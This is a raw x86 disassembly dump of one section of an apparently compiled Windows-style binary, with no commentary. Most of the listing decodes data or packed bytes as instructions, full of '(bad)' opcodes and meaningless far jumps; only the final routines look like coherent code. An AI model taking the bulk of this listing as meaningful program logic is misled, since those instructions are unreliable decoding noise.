  443f0d:	add    BYTE PTR [edi+edi*8],dh
  443f10:	add    BYTE PTR [edi-0x768b00d8],bh
  443f16:	mov    ah,0xff
  443f18:	jmp    FWORD PTR [ebx-0x26]
  443f1b:	call   FWORD PTR [ebx+0x0]
  443f1e:	add    DWORD PTR [eax],0x8352b5cc
  443f24:	fdivr  st,st(7)
  443f26:	das    
  443f27:	(bad)  
  443f28:	(bad)  
  443f29:	fstp   DWORD PTR [ebp-0x1]
  443f2c:	cmp    ah,cl
  443f2e:	sbb    edi,edi
  443f30:	add    ah,cl
  443f32:	aam    0xff
  443f34:	test   al,0xff
  443f36:	cmp    DWORD PTR [eax],eax
  443f38:	add    BYTE PTR [edi+0x5f],ch
  443f3b:	sbb    ecx,0x0
  443f3e:	cdq    
  443f3f:	add    ah,cl
  443f41:	lods   al,BYTE PTR ds:[esi]
  443f42:	sub    BYTE PTR [ebx-0x3600af],al
  443f48:	add    BYTE PTR [ebp-0x6c],bh
  443f4b:	jmp    ebx
  443f4d:	cmp    ebx,0x0
  443f50:	call   FWORD PTR [eax+0x4b]
  443f53:	push   DWORD PTR [edx+0xffb000]
  443f59:	cs dec ecx
  443f5b:	add    BYTE PTR [esi],dl
  443f5d:	int3   
  443f5e:	xchg   edx,eax
  443f5f:	add    bh,bh
  443f61:	sahf   
  443f62:	ret    
  443f63:	add    BYTE PTR [ecx],ah
  443f65:	dec    ecx
  443f67:	add    BYTE PTR [ebx+0x7083427e],al
  443f6d:	jmp    FWORD PTR ds:0xd119ff89
  443f73:	inc    DWORD PTR [eax]
  443f75:	and    ecx,0x0
  443f78:	jmp    esp
  443f7a:	push   0x0
  443f7c:	xor    eax,DWORD PTR [eax]
  443f7e:	pop    es
  443f7f:	inc    DWORD PTR [eax]
  443f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443f82:	arpl   WORD PTR [ebx-0x7c72ff2f],ax
  443f88:	xor    ebx,0xfffffff5
  443f8b:	call   FWORD PTR [ebx-0x1]
  443f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443f8f:	int3   
  443f90:	call   FWORD PTR [eax]
  443f92:	pop    edx
  443f93:	dec    DWORD PTR [eax-0x1]
  443f96:	or     bh,bh
  443f98:	call   esp
  443f9a:	jno    0x443f9c
  443f9c:	adc    BYTE PTR [eax],al
  443f9e:	ret    
  443f9f:	inc    DWORD PTR [eax]
  443fa1:	loop   0x443f9c
  443fa3:	add    ch,bh
  443fa5:	add    BYTE PTR [esi-0x7cfc007d],al
  443fab:	call   FWORD PTR [esi-0x7d]
  443fae:	nop
  443faf:	add    bh,bh
  443fb1:	sbb    esi,DWORD PTR [edx+0x0]
  443fb4:	or     al,BYTE PTR [ebx-0x2bffffe7]
  443fba:	(bad)  
  443fbb:	(bad)  
  443fbc:	fcos   
  443fbe:	(bad)  
  443fbf:	inc    DWORD PTR [eax]
  443fc1:	rcl    BYTE PTR [esp+ecx*8],cl
  443fc4:	leave  
  443fc5:	jmp    FWORD PTR [ebp-0x46930034]
  443fcb:	int3   
  443fcc:	jp     0x443fce
  443fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443fcf:	inc    DWORD PTR [eax]
  443fd1:	push   ds
  443fd2:	mov    al,ds:0x7fff4083
  443fd7:	add    bh,bh
  443fd9:	sbb    DWORD PTR ds:0x1f008800,edx
  443fdf:	inc    DWORD PTR [ebx+0x6c007d71]
  443fe5:	push   DWORD PTR [esi+0x0]
  443fe8:	call   DWORD PTR [ebx-0x7c6e00d7]
  443fee:	push   ds
  443fef:	dec    DWORD PTR [ecx+0x4aff3ce4]
  443ff5:	(bad)  
  443ff6:	cli    
  443ff7:	(bad)  
  443ff8:	jmp    FWORD PTR [esi-0x339a00c3]
  443ffe:	(bad)  
  443fff:	int3   
  444000:	(bad)  
  444001:	mov    edi,0xff9e83f1
  444006:	test   BYTE PTR [eax],0xff
  444009:	sub    eax,0x89fbff5e
  44400e:	xor    edi,edi
  444010:	add    dl,ch
  444012:	bound  eax,QWORD PTR [eax]
  444014:	pop    ds
  444015:	add    BYTE PTR [esi+0x695e8300],dh
  44401b:	mov    DWORD PTR [esi-0x7d],ebx
  44401e:	rol    DWORD PTR [eax],0x89
  444021:	and    eax,edi
  444023:	mov    DWORD PTR [ebp+0x836e00],ebx
  444029:	sub    eax,0x833400a2
  44402e:	sub    al,BYTE PTR [eax]
  444030:	add    BYTE PTR [edx],ah
  444032:	pop    edi
  444033:	add    BYTE PTR [esi],dl
  444035:	call   FWORD PTR [eax]
  444037:	int3   
  444038:	add    BYTE PTR [edx-0x5a],ch
  44403b:	add    ah,ah
  44403d:	call   ebx
  44403f:	inc    DWORD PTR [eax]
  444041:	mov    ds:0x83360044,al
  444046:	aaa    
  444047:	inc    DWORD PTR [ebx+0x2f89a11a]
  44404d:	add    BYTE PTR [edi-0x1],cl
  444050:	inc    ebp
  444052:	(bad)  
  444054:	xor    edi,edi
  444056:	lods   al,BYTE PTR ds:[esi]
  444057:	dec    DWORD PTR [ecx-0x3cffdea2]
  44405d:	jmp    ebp
  44405f:	dec    DWORD PTR [ecx-0x2fffd2c1]
  444065:	jmp    DWORD PTR [edi+edi*8-0x7cbd957d]
  44406c:	mov    al,0xff
  44406e:	test   ah,cl
  444070:	call   DWORD PTR [ebx-0xd002c]
  444076:	lods   al,BYTE PTR ds:[esi]
  444077:	(bad)  
  444078:	call   FWORD PTR [ebx-0x55]
  44407b:	and    DWORD PTR [edx],0x0
  44407e:	and    BYTE PTR [eax],al
  444080:	push   DWORD PTR [ecx-0x7615ff5f]
  444086:	inc    edx
  444087:	add    DWORD PTR [ebx+0x5fff105f],0x0
  44408e:	jp     0x44408f
  444090:	call   DWORD PTR [esi-0x4f]
  444093:	dec    DWORD PTR [eax]
  444095:	jmp    esi
  444097:	inc    DWORD PTR [eax]
  444099:	imul   dh
  44409b:	dec    DWORD PTR [eax+0x0]
  44409e:	stos   DWORD PTR es:[edi],eax
  44409f:	add    BYTE PTR [ebx+0x8ff13ec],al
  4440a5:	add    BYTE PTR [edi+0x294e0083],ch
  4440ab:	inc    DWORD PTR [edi]
  4440ad:	sub    DWORD PTR [ebx+eax*4+0xddc3ff],0x4f
  4440b5:	add    BYTE PTR [ebx-0x1],ch
  4440b8:	inc    edx
  4440ba:	(bad)  
  4440bb:	adc    DWORD PTR [ebx],0x0
  4440be:	xor    bh,bh
  4440c0:	int3   
  4440c1:	mov    ds:0xcca500ef,eax
  4440c6:	mov    ecx,0x58f783ff
  4440cb:	add    BYTE PTR [ebp-0x7d],ch
  4440ce:	leave  
  4440cf:	(bad)  
  4440d0:	dec    DWORD PTR [eax-0x79]
  4440d3:	and    DWORD PTR [esi-0xff2d00],0xffffff8b
  4440da:	retf   
  4440db:	jmp    DWORD PTR [ecx+0xff4eff]
  4440e1:	mov    al,0x26
  4440e3:	jmp    DWORD PTR [edi+edi*8]
  4440e6:	jo     0x4440e7
  4440e8:	call   FWORD PTR [ebx]
  4440ea:	sbb    DWORD PTR fs:[ecx-0x1],0xffffffc9
  4440ef:	add    bh,bh
  4440f1:	mov    cl,BYTE PTR [eax]
  4440f3:	inc    DWORD PTR [ecx-0x3300987d]
  4440f9:	fnstenv [edi+edi*8+0x2b]
  4440fd:	call   FWORD PTR [esi]
  4440ff:	add    bh,bh
  444101:	(bad)  
  444102:	xor    eax,DWORD PTR [eax]
  444104:	xchg   esi,eax
  444105:	(bad)  
  444106:	fdivr  st,st(7)
  444108:	add    BYTE PTR [edi+eiz*2],ch
  44410b:	cmp    DWORD PTR [eax-0xff857d],0x69
  444112:	jp     0x444114
  444114:	ret    
  444115:	add    BYTE PTR [eax-0x7d9f3301],al
  44411b:	int3   
  44411c:	sub    edi,edi
  44411e:	arpl   WORD PTR [ebx-0xd76c34],ax
  444124:	push   edx
  444125:	cmp    DWORD PTR [ecx+0x0],0xffffffff
  444129:	test   esi,edi
  44412b:	jmp    FWORD PTR [edi]
  44412d:	mov    ecx,ebp
  44412f:	dec    DWORD PTR [ecx+0xffb62c]
  444135:	add    BYTE PTR [eax+0x777fffff],bh
  44413b:	add    BYTE PTR [edi+edi*8],dh
  44413e:	sub    eax,0x6165ff89
  444143:	call   DWORD PTR [eax+eax*1]
  444146:	add    edi,edi
  444148:	jmp    DWORD PTR [edi-0x7c790024]
  44414e:	(bad)  
  44414f:	inc    DWORD PTR [eax]
  444151:	xor    eax,0xff15ff01
  444156:	sub    eax,0xcd0cffcc
  44415b:	jmp    DWORD PTR ds:0xff002900
  444161:	mov    ch,0xcc
  444163:	add    BYTE PTR [edi+edi*8-0x74],ah
  444167:	add    BYTE PTR [eax],al
  444169:	mov    esi,DWORD PTR [ecx-0x77]
  44416c:	and    eax,0x83cc4f00
  444171:	jnp    0x4440fb
  444173:	(bad)  
  444174:	out    dx,eax
  444175:	dec    DWORD PTR [esp+ecx*8+0xe8f8ff]
  44417c:	push   ds
  44417d:	jmp    FWORD PTR [ebx-0x426a767d]
  444183:	(bad)  
  444184:	mov    esp,0xb2ff
  444189:	sub    DWORD PTR [eax],edx
  44418b:	jmp    FWORD PTR [esi]
  44418d:	adc    DWORD PTR [edx-0x1],0x0
  444191:	mov    ah,0x53
  444193:	add    BYTE PTR [edx],dl
  444195:	adc    DWORD PTR [ecx+0x3702ffff],0xffffff83
  44419c:	sub    al,0xff
  44419e:	mov    esp,0x3e30ffff
  4441a3:	add    BYTE PTR [edx-0x77],dl
  4441a6:	(bad)  
  4441a8:	call   DWORD PTR [ebp+0x1b]
  4441ab:	mov    esi,edx
  4441ad:	add    ah,ah
  4441af:	dec    DWORD PTR [ecx-0x33ff0e5a]
  4441b5:	add    cl,ch
  4441b7:	cmp    edi,0x45
  4441ba:	retf   
  4441bb:	add    DWORD PTR [edx],0xffffffff
  4441be:	in     al,0x83
  4441c0:	call   FWORD PTR [eax]
  4441c2:	repnz jmp FWORD PTR [esi]
  4441c5:	jmp    edi
  4441c7:	(bad)  
  4441c8:	(bad)  
  4441c9:	mov    ebx,0xff2800a6
  4441ce:	jns    0x4441cf
  4441d0:	push   DWORD PTR [eax]
  4441d2:	aas    
  4441d3:	add    ah,ch
  4441d5:	add    BYTE PTR [eax+eax*1],dl
  4441d8:	push   DWORD PTR [esi+0xc28900]
  4441de:	(bad)  
  4441df:	int3   
  4441e0:	(bad)  
  4441e1:	cmp    dl,dh
  4441e3:	jmp    FWORD PTR [ebp-0x34]
  4441e6:	sbb    edi,edi
  4441e8:	mov    DWORD PTR [ebx],edx
  4441ea:	push   ebp
  4441eb:	add    BYTE PTR [eax],cl
  4441ed:	mov    DWORD PTR [esi-0x1],ebp
  4441f0:	dec    ebx
  4441f2:	pop    esp
  4441f3:	jmp    FWORD PTR [ecx+ecx*4]
  4441f6:	push   ds
  4441f7:	mov    edi,edi
  4441f9:	add    ecx,DWORD PTR [eax+eax*1]
  4441fc:	leave  
  4441fd:	xor    esi,0xffffffff
  444200:	(bad)  
  444201:	mov    ebx,0xeb0065
  444206:	out    0xff,eax
  444208:	add    BYTE PTR [edi],dh
  44420a:	xchg   ebp,eax
  44420b:	call   FWORD PTR [ebx]
  44420d:	call   DWORD PTR [esi-0x24d60034]
  444213:	add    BYTE PTR [edx-0x1],bl
  444216:	mov    ah,0xff
  444218:	add    BYTE PTR [eax-0xa],dl
  44421b:	call   DWORD PTR [ecx]
  44421d:	add    BYTE PTR [ecx-0x1],bl
  444220:	add    BYTE PTR [ebx-0xba0075],dl
  444226:	xor    DWORD PTR [ebx-0x7c565401],eax
  44422c:	in     al,dx
  44422d:	add    BYTE PTR [eax-0x31737c7d],bh
  444233:	or     DWORD PTR ds:0xffffb2ff,0x7
  44423a:	test   eax,0x78ffff00
  44423f:	int3   
  444240:	mov    DWORD PTR [eax+0x6f835f],ebx
  444246:	outs   dx,BYTE PTR ds:[esi]
  444247:	inc    DWORD PTR [eax]
  444249:	rol    DWORD PTR [edx-0x60ff9501],1
  44424f:	inc    DWORD PTR [eax]
  444251:	inc    ebp
  444252:	fiadd  DWORD PTR [ebx-0x7cd6ff0d]
  444258:	add    BYTE PTR [ebx+0x2600b0],dh
  44425e:	pop    edi
  44425f:	(bad)  
  444260:	push   DWORD PTR [edx+0xb7ff6c]
  444266:	xor    edi,edi
  444268:	add    BYTE PTR [eax],dl
  44426a:	dec    eax
  44426b:	adc    edi,0xffffffff
  44426e:	das    
  44426f:	mov    edi,edi
  444271:	mov    dh,0xd3
  444273:	inc    ebp
  444275:	jmp    DWORD PTR [edi+edi*8]
  444278:	sbb    DWORD PTR [edx],0x1
  44427b:	push   DWORD PTR [eax-0xff7d01]
  444281:	add    al,0x2e
  444283:	add    BYTE PTR [ebp-0xe401],bl
  444289:	xor    eax,0xff18ffc5
  44428e:	fiadd  DWORD PTR [ebx-0x14af01]
  444294:	pop    es
  444295:	dec    DWORD PTR [eax-0x3dde0000]
  44429b:	int3   
  44429c:	stos   BYTE PTR es:[edi],al
  44429d:	call   FWORD PTR [edi-0x264e0100]
  4442a3:	add    bh,dh
  4442a5:	mov    esp,ebx
  4442a7:	inc    DWORD PTR [eax]
  4442a9:	or     al,0xff
  4442ab:	dec    DWORD PTR [ebp-0x1]
  4442ae:	jb     0x4442b0
  4442b0:	add    ch,cl
  4442b2:	xlat   BYTE PTR ds:[ebx]
  4442b3:	add    al,ah
  4442b5:	add    DWORD PTR [ebx-0x622c0000],0xffffffff
  4442bc:	push   0x83895400
  4442c1:	sub    bh,BYTE PTR [ebx-0x1]
  4442c4:	int    0xff
  4442c6:	das    
  4442c7:	int3   
  4442c8:	push   DWORD PTR [esi-0xd87c57]
  4442ce:	(bad)  
  4442cf:	int3   
  4442d0:	add    BYTE PTR [ecx-0x77],al
  4442d3:	cmp    DWORD PTR [edx-0xff2200],0x64
  4442da:	adc    al,0xff
  4442dc:	fmul   st,st(4)
  4442de:	push   ecx
  4442df:	(bad)  
  4442e0:	dec    DWORD PTR [ebx+edi*8]
  4442e3:	int3   
  4442e4:	rol    BYTE PTR [ebx-0x47ffff8d],cl
  4442ea:	jge    0x444275
  4442ec:	int3   
  4442ed:	add    cl,ah
  4442ef:	mov    DWORD PTR [ecx-0x16ffbf63],ecx
  4442f5:	push   DWORD PTR [ecx+0x0]
  4442f8:	mov    DWORD PTR [edx-0x6f0053],ecx
  4442fe:	push   ds
  4442ff:	cmp    edi,0x2b
  444302:	mov    cl,0xff
  444304:	mov    esi,0xff8997ff
  444309:	xor    bh,BYTE PTR [ebx]
  44430b:	add    BYTE PTR [eax+0x1eff],bl
  444311:	(bad)  [ebp-0x55fff434]
  444317:	(bad)  
  444318:	call   DWORD PTR [ebp-0x62]
  44431b:	inc    esi
  44431d:	dec    DWORD PTR [esp+ecx*8-0x3342f877]
  444324:	push   edx
  444325:	and    DWORD PTR [edi-0x4030ff77],0x0
  44432c:	loope  0x4442b7
  44432e:	jns    0x44432f
  444330:	jmp    DWORD PTR [eax]
  444332:	xchg   esp,eax
  444333:	jmp    DWORD PTR [ecx-0x7c004601]
  444339:	push   esp
  44433a:	push   ebx
  44433b:	inc    DWORD PTR [esi-0x77]
  44433e:	add    DWORD PTR [eax],eax
  444340:	add    bl,bl
  444342:	sahf   
  444343:	int3   
  444344:	push   cs
  444345:	add    BYTE PTR [eax],ch
  444347:	(bad)  
  444348:	(bad)  
  444349:	ds xor eax,0xe8009400
  44434f:	inc    DWORD PTR [ebx-0x2500fc0e]
  444355:	jmp    DWORD PTR [ebp-0x68330100]
  44435b:	int3   
  44435c:	cmp    edi,0xffffffd0
  44435f:	add    BYTE PTR [ebx-0x257c3630],al
  444365:	add    BYTE PTR [esi-0x1],dl
  444368:	int3   
  444369:	stos   BYTE PTR es:[edi],al
  44436a:	push   cs
  44436b:	and    DWORD PTR [ebx],0x0
  44436e:	fadd   QWORD PTR [eax]
  444370:	add    BYTE PTR [ebp-0x33ce0039],al
  444376:	mov    eax,0xb2510000
  44437b:	(bad)  
  44437c:	jl     0x444301
  44437e:	sbb    ecx,DWORD PTR [ecx+0xd8f0ff]
  444384:	dec    eax
  444385:	cmp    DWORD PTR [edx-0x6140ff7d],0xffffffff
  44438c:	(bad)  
  44438d:	call   eax
  44438f:	add    BYTE PTR [eax],al
  444391:	mov    bl,0x5c
  444393:	int3   
  444394:	lldt   WORD PTR [edx-0x4b197601]
  44439b:	dec    ebx
  44439d:	add    BYTE PTR [edi+0x73afffff],bl
  4443a3:	inc    esp
  4443a5:	call   esp
  4443a7:	inc    DWORD PTR [eax]
  4443a9:	imul   edx,DWORD PTR [ebx+eax*4],0xffffffa4
  4443ad:	call   FWORD PTR [edi+edi*8]
  4443b0:	jmp    DWORD PTR [edx]
  4443b2:	in     al,0x0
  4443b4:	push   0xccdb00
  4443b9:	inc    edi
  4443ba:	inc    edi
  4443bb:	call   FWORD PTR [ebx-0x1]
  4443be:	cmp    ah,cl
  4443c0:	(bad)  
  4443c1:	jle    0x44439c
  4443c3:	add    BYTE PTR [edx],cl
  4443c5:	call   FWORD PTR [edi-0x1]
  4443c8:	int3   
  4443c9:	push   cs
  4443ca:	cdq    
  4443cb:	sbb    DWORD PTR [ebx-0x1],0x57
  4443cf:	add    DWORD PTR [eax],0x3
  4443d2:	and    bh,bh
  4443d4:	add    DWORD PTR [eax],0xa3ffff13
  4443da:	xchg   esp,eax
  4443db:	dec    DWORD PTR [ebp+0x0]
  4443de:	in     al,0xff
  4443e0:	call   FWORD PTR [edi-0x4e]
  4443e3:	add    BYTE PTR [edi+edi*8+0x6ff0000],ch
  4443ea:	fwait
  4443eb:	add    BYTE PTR [edi-0x3300ce01],dh
  4443f1:	jp     0x444408
  4443f3:	add    BYTE PTR [ecx],bl
  4443f5:	push   DWORD PTR [edi+0xd75cc00]
  4443fb:	add    ah,cl
  4443fd:	int3   
  4443fe:	je     0x4443cc
  444400:	add    bl,ch
  444402:	idiv   edi
  444404:	pop    ecx
  444405:	mov    edx,esi
  444407:	add    BYTE PTR [eax],al
  444409:	jns    0x444396
  44440b:	add    BYTE PTR [edx],ch
  44440d:	add    BYTE PTR [ebp-0x4d517c01],ah
  444413:	jmp    DWORD PTR [esi]
  444415:	add    bh,cl
  444417:	add    BYTE PTR [eax],al
  444419:	mov    cl,0x0
  44441b:	add    BYTE PTR [edi],ch
  44441d:	or     DWORD PTR [edi-0x7e820001],0x0
  444424:	gs int3 
  444426:	fild   WORD PTR [eax]
  444428:	jmp    DWORD PTR [edx-0x62]
  44442b:	jmp    FWORD PTR [ebx]
  44442d:	add    bl,ah
  44442f:	add    DWORD PTR [eax],0xffffffdd
  444432:	pop    ss
  444433:	add    BYTE PTR [edi-0xff557d],bh
  444439:	daa    
  44443a:	and    eax,0xee009400
  44443f:	add    bh,bh
  444441:	arpl   WORD PTR [edx-0x1],bx
  444444:	adc    WORD PTR [ecx+0x25f1ff83],0x0
  44444c:	or     bh,bh
  44444e:	call   0x2771c852
  444453:	add    BYTE PTR [ecx-0x7d],dl
  444456:	add    edi,edi
  444458:	jmp    FWORD PTR [eax]
  44445a:	mov    ebx,0xe007500
  44445f:	add    bh,bh
  444461:	test   eax,0xffa5ff8b
  444466:	repz inc DWORD PTR [eax]
  444469:	cmp    dl,0x0
  44446c:	mov    ah,0x0
  44446e:	pop    es
  44446f:	add    bh,bh
  444471:	xchg   al,bl
  444473:	int3   
  444474:	mov    dh,0xff
  444476:	and    eax,0x796e8300
  44447b:	mov    DWORD PTR [ebp+0xff96ff],ecx
  444481:	push   ds
  444482:	add    ah,cl
  444484:	add    edi,edi
  444486:	loope  0x444487
  444488:	sbb    DWORD PTR [ebx],0xffffffa7
  44448b:	jmp    DWORD PTR [ebx]
  44448d:	mov    edx,edi
  44448f:	add    bh,bh
  444491:	fwait
  444492:	sbb    BYTE PTR [ecx-0x337b00c3],cl
  444498:	call   DWORD PTR [edi+eiz*8]
  44449b:	jmp    FWORD PTR [ecx-0x1]
  44449e:	loopne 0x444423
  4444a0:	add    BYTE PTR [ebx],bh
  4444a2:	test   eax,0x5b890000
  4444a7:	inc    DWORD PTR [eax]
  4444a9:	add    dh,BYTE PTR [eax-0x34]
  4444ac:	inc    edi
  4444ad:	add    al,dl
  4444af:	inc    DWORD PTR [ebx-0x7aff737a]
  4444b5:	add    dh,al
  4444b7:	int3   
  4444b8:	dec    DWORD PTR [esi+0x5d00f1]
  4444be:	std    
  4444bf:	int3   
  4444c0:	call   FWORD PTR [eax+esi*1]
  4444c3:	jmp    edi
  4444c5:	add    cl,cl
  4444c7:	dec    DWORD PTR [ecx+0x3200a812]
  4444cd:	dec    DWORD PTR [ecx-0x1]
  4444d0:	int3   
  4444d1:	adc    BYTE PTR [edi],cl
  4444d3:	xor    DWORD PTR [esi-0xffec7d],0xfffffff3
  4444da:	in     eax,dx
  4444db:	mov    eax,esp
  4444dd:	inc    DWORD PTR [edi]
  4444df:	add    BYTE PTR [ebx+0x4bff49bd],al
  4444e5:	add    BYTE PTR [ecx],al
  4444e7:	mov    esp,ecx
  4444e9:	icebp  
  4444ea:	push   ecx
  4444eb:	call   DWORD PTR [esi-0x1]
  4444ee:	scas   al,BYTE PTR es:[edi]
  4444ef:	mov    DWORD PTR [ebx+0x3fff3a9d],eax
  4444f5:	add    dh,ch
  4444f7:	add    BYTE PTR [eax],al
  4444f9:	jg     0x4444c9
  4444fb:	int3   
  4444fc:	push   esi
  4444fd:	(bad)  
  4444fe:	inc    DWORD PTR [eax]
  444500:	add    BYTE PTR [edi+eax*4-0x1],bh
  444504:	lods   eax,DWORD PTR ds:[esi]
  444505:	call   DWORD PTR [eax-0x7d]
  444508:	dec    DWORD PTR [edx]
  44450a:	(bad)  
  44450c:	aaa    
  44450d:	int3   
  44450e:	ds or  esp,0xfffffff1
  444512:	mov    DWORD PTR [eax],eax
  444514:	rol    BYTE PTR [ebx-0x3533ffbd],1
  44451a:	mov    edi,?
  44451c:	mov    ah,0x0
  44451e:	ret    
  44451f:	inc    DWORD PTR [eax]
  444521:	les    ecx,FWORD PTR [eax+eax*1-0xa500c3]
  444528:	mov    edx,eax
  44452a:	push   ds
  44452b:	(bad)  
  44452c:	fdivp  st(7),st
  44452e:	push   ebp
  44452f:	(bad)  
  444530:	call   DWORD PTR [esi+0x6ecc1c]
  444536:	xor    DWORD PTR [ecx-0x33091400],ecx
  44453c:	lods   al,BYTE PTR ds:[esi]
  44453d:	(bad)  
  44453e:	jp     0x444540
  444540:	add    BYTE PTR [esi-0x7c5f00f7],bh
  444546:	lods   eax,DWORD PTR ds:[esi]
  444547:	(bad)  
  444548:	push   DWORD PTR [ebx+0x14]
  44454b:	add    BYTE PTR [ebx-0x7d],dh
  44454e:	adc    al,BYTE PTR [eax]
  444550:	and    DWORD PTR [ecx+0xc],0xffffffff
  444554:	lahf   
  444555:	call   DWORD PTR [esi+0x75158383]
  44455b:	call   DWORD PTR [ebx+0x51004eff]
  444561:	mov    eax,ds:0x445070
  444566:	lea    ecx,[esp]
  444569:	push   ecx
  44456a:	push   0x0
  44456c:	mov    ds:0x448d48,eax
  444571:	call   eax
  444573:	mov    eax,DWORD PTR [esp]
  444576:	mov    edx,DWORD PTR [eax]
  444578:	mov    edx,DWORD PTR [edx+0x48]
  44457b:	lea    ecx,[esp]
  44457e:	push   ecx
  44457f:	push   eax
  444580:	push   eax
  444581:	call   edx
  444583:	mov    ds:0x448d1c,eax
  444588:	xor    eax,eax
  44458a:	pop    ecx
  44458b:	ret    0x4
  44458e:	int3   
  44458f:	int3   
  444590:	mov    eax,ds:0x445000
  444595:	mov    ds:0x44a000,eax
  44459a:	ret    
  44459b:	int3   
  44459c:	int3   
  44459d:	int3   
  44459e:	int3   
  44459f:	int3   
  4445a0:	mov    eax,ds:0x445004
  4445a5:	mov    ds:0x44900c,eax
  4445aa:	ret    
  4445ab:	int3   
  4445ac:	int3   
  4445ad:	int3   
  4445ae:	int3   
  4445af:	int3   
  4445b0:	mov    eax,ds:0x445004
  4445b5:	mov    ds:0x44a004,eax
  4445ba:	ret    
  4445bb:	int3   
  4445bc:	int3   
  4445bd:	int3   
  4445be:	int3   
  4445bf:	int3   
  4445c0:	mov    eax,ds:0x445044
  4445c5:	mov    ds:0x449008,eax
  4445ca:	ret    
